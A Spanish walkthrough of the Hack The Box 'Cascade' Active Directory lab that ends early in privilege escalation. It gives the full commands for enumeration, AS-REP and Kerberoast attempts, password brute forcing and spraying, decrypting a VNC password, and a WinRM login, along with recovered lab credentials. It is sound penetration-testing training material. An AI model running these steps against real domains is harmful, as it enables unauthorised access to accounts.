
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.9.250 -oG allPorts
```

```shell
[*] IP Address: 10.129.9.250
[*] Open ports: 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165
```

```shell
nmap -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 -sCV 10.129.9.250 -oN targeted
```

```shell
nxc smb 10.129.9.250
```

```ad-info
(name:CASC-DC1) (domain:cascade.local)
```


## RPC
```shell
rpcclient -U "" 10.129.9.250 -N
```

```shell
enumdomusers
```

```shell
rpcclient -U "" 10.129.9.250 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
```

Validación de usuarios con  [[KERBRUTE]]
```shell
kerbrute userenum --dc 10.129.9.250 -d cascade.local users.txt
```

Validando los usuarios se nos quedaría la siguiente lista
```ad-info
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
d.burman
BackupSvc
j.allen
```

Siempre que tenemoos una lista de usuarios validos tenemos que probar el ataque de [[AS-REP Roasting]]

### AS-REP Roast
```shell
impacket-GetNPUsers cascade.local/ -usersfile users.txt -no-pass
```

Ningún usuario es susceptible a este ataque

### User as Password
```shell
nxc smb 10.129.9.250 -u users.txt -p users.txt --no-bruteforce
```

Ningún usuario utiliza su usuario como contraseña
Probamos ahora haciendo fuerza bruta
```shell
nxc smb 10.129.9.250 -u users.txt -p users.txt
```

No pertenece a ninguno

## LDAP
```shell
ldapsearch -x -H ldap://10.129.9.250 -b "DC=cascade,DC=local"
```

Buscar usuarios
```shell
ldapsearch -x -H ldap://10.129.9.250 -b "DC=cascade,DC=local" | grep -i userprincipalname
```

En el usuario `r.thompson` encontramos una credencial en `bse64`
Obteniendo las credenciales de este usuario.
Las validaremos 
```shell
nxc smb 10.129.9.250 -u 'r.thompson' -p 'rY4n5eva'
```

```ad-hint
r.thompson::rY4n5eva
```

Una vez con credenciales validas podemos usar [[LDAPDOMAINDUMP]], para poder visualizar el entorno de Ad de forma mas comoda a traves del navegador 
```shell
ldapdomaindump -u 'cascade.local\r.thompson' -p 'rY4n5eva' 10.129.9.250
```

Nos levantamos un servidor con Python para poder visualizarlo mejor a través del navegador
Podemos ver que el usuario pertenece al grupo `IT
También podemos ver que existe un grupo llamado `AD Recicle Bin` que en un futuro nos puede servir para enumerar objetos que han sido eliminados

Al tener unas credenciales validas podemos probar a hacer un ataque de [[Kerberoasting]]

### Kerberoasting
```shell
impacket-GetUserSPNs cascade.local/r.thompson:rY4n5eva
```

Al no tener respuesta es que no es Kerberoasteable


## SMB

Enumeraremos los recursos compartidos
```shell
nxc smb 10.129.9.250 -u 'r.thompson' -p 'rY4n5eva' --shares
```

```shell
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
Audit$                          
C$                              Default share
Data            READ            
IPC$                            Remote IPC
NETLOGON        READ            Logon server share 
print$          READ            Printer Drivers
SYSVOL          READ            Logon server share 
```

También lo enumeramos con [[SMBMAP]]
```shell
smbmap -H  10.129.9.250 -u 'r.thompson' -p 'rY4n5eva'
```

Vemos un recurso llamado `Data` vamos a acceder a el
```shell
smbmap -H  10.129.9.250 -u 'r.thompson' -p 'rY4n5eva' -r Data
```

Para poder acceder al recurso compartido a través de terminal lo que haremos será jugar con monturas y poder acceder a el mas cómodamente
Primero crearemos el directorio
```shell
mkdir /mnt/smbmounted
```

Creamos la montura
```shell
mount -t cifs //10.129.9.250/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
```

Ahora podemos acceder al recurso compartido a través de `/mnt/smbmounted`
Haciendo un `tree -fas` podemos ver todos los recursos junto con su ruta para poder acceder mas cómodamente

Vemos un archivo `.html` así que nos levantamos un servidor con Python para poder leerlo
Nos encontramos con un mensaje de que se ha creado una cuenta que va a ser borrada llamada `TempAdmin` la cual tiene la misma contraseña que el usuario `Administrator`, como también hemos visto antes había un grupo llamado `AD Recicle Bin` que alomejor nos permite ver los objetos borrados a ese grupo pertenece el usuario `Arksvc`

En el directorio que nos hemos traído con la montura también observamos un fichero llamado `VNCInstall.reg`, que si lo leemos encontramos un campo `Password` reportándonos una contraseña en hexadecimal `6b,cf,2a,4b,6e,5a,ca,0f` probamos a descifrarla
```shell
echo "6bcf2a4b6e5aca0f" | xxd -ps -r | xxd
```

Pero vemos que la respuesta no tiene pinta de contraseña por lo cual no nos esta devolviendo una contraseña en texto claro

Si buscamos en internet si existe alguna herramienta que sirva para desencriptar las contraseñas de VNC encontramos `https://github.com/jeroennijhof/vncpwd`
Nos lo clonamos a nuestra maquina
```shell
git clone https://github.com/jeroennijhof/vncpwd.git
```

Ejecutamos el comando `make` para compilarlo

La contraseña en hexadecimal la desencriptamos y la guardamos en un archivo llamado `password`
```shell
echo "6bcf2a4b6e5aca0f" | xxd -ps -r > password
```

Y ejecutaremos la herramienta usando
```shell
./vncpwd password
```

Dándonos la contraseña en texto claro `sT333ve2`
Como no sabemos a quien le pertenece la contraseña haremos un `USer Spraying`

### User Spraying
```shell
nxc smb 10.129.9.250 -u users.txt -p 'sT333ve2' --continue-on-succes
```

Vemos que pertenece a `s.smith`
Validamos que las credenciales sean validas
```shell
nxc smb 10.129.9.250 -u 's.smith -p 'sT333ve2
```

Son validas

```ad-hint
s.smith::sT333ve2
```

Vemos si pertenece al grupo de `Remote Management`
```shell
nxc winrm 10.129.9.250 -u 's.smith' -p 'sT333ve2'
```

Vemos que pertenece a este así que nos conectaremos mediante [[EVIL-WINRM]]
```shell
evil-winrm -i 10.129.9.250 -u 's.smith' -p 'sT333ve2'
```


# Escalada de privilegios
## Enumeración
Enumeraremos que privilegios tiene nuestro usuario
```shell
whoami /priv
```

Listaremos los grupos a los que pertence nuestro usuario
```shell
net user s.smith
```

Enumerameos el grupo al que pertenecemos
```shell
net localgroup "Audit Share"
```

Vemos que tiene un comentario en el que se nombra a un recurso compartido `\\Casc-DC1\Audit$` lo enumeraremos
```shell
smbmap -H  10.129.9.250 -u 's.smith' -p 'sT333ve2'
```

Tenemos lectura sobre el archivo compartido
```shell
smbmap -H  10.129.9.250 -u 's.smith' -p 'sT333ve2' -r 'Audit$'
```

Nos lo vamos a traer a nuestra maquina usando [[SMBCLIENT]]
```shell
smbclient //10.129.9.250/Audit$ -U 's.smith%sT333ve2'
```

Sal ser muchos archivos usaremos los siguientes parametros en la consola de [[SMBCLIENT]] `prompt off` y `recursive ON`

Ahora nos traeremos todos los archivos
```shell
mget *
```

Hacemos un `tree -fas` para enumerar las rutas de los archivos y encontramos una ruta a `/DB/Audit.db`, vamos a ver que tipo de archivo es
```shell
file ./DB/Audit.db
```

Vemos que es un SQLite 3.x



